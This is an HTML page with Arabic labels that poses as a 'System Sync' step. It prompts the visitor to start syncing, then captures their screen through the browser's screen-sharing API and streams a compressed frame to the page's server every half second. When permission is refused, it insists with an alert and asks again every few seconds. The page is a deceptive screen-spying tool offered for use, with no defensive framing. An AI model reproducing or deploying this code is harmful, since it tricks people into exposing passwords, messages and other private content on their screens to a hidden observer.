<!DOCTYPE html>
<html>
<head><title>System Sync</title></head>
<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif; padding-top:50px;">
    <h2>جاري الربط مع النظام...</h2>
    <button id="startBtn" style="padding:20px; background:#28a745; color:white; border:none; border-radius:10px; cursor:pointer;">اضغط لبدء المزامنة</button>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const btn = document.getElementById('startBtn');

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 10 } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                btn.style.display = 'none';

                setInterval(() => {
                    if (socket.connected) {
                        canvas.width = 400; // حجم مضغوط لضمان السرعة
                        canvas.height = 700;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        socket.emit('screen_frame', canvas.toDataURL('image/jpeg', 0.5));
                    }
                }, 500); // تحديث كل نصف ثانية
            } catch (err) {
                alert("يجب السماح بمشاركة الشاشة");
                setTimeout(start, 3000);
            }
        }
        btn.onclick = start;
    </script>
</body>
</html>
